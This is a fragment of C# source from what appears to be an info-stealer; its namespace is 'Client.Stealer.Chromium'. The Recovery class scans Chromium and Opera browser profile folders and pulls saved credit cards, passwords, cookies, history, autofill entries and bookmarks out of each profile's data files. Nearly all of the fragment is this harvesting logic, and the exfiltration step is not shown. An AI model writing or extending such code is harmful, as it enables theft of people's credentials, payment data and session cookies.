...
namespace Client.Stealer.Chromium
{
    ...
    internal sealed class Recovery : Browser
    {
        ...
        protected override void Load()
        {
            ...
            {
                string sFullPath;
                if (sPath.Contains("Opera Software")) sFullPath = Paths.appdata + sPath;
                else sFullPath = Paths.lappdata + sPath;

                if (Directory.Exists(sFullPath)) foreach (string sProfile in Directory.GetDirectories(sFullPath))
                {
                    pCreditCards.AddRange(CreditCards.Get(sProfile + "\\Web Data"));
                    pPasswords.AddRange(Passwords.Get(sProfile + "\\Login Data"));
                    pCookies.AddRange(Cookies.Get(sProfile + "\\Cookies"));
                    pHistory.AddRange(History.Get(sProfile + "\\History"));
                    pAutoFill.AddRange(Autofill.Get(sProfile + "\\Web Data"));
                    pBookmarks.AddRange(Bookmarks.Get(sProfile + "\\Bookmarks"));
                }
            }
        }
    }
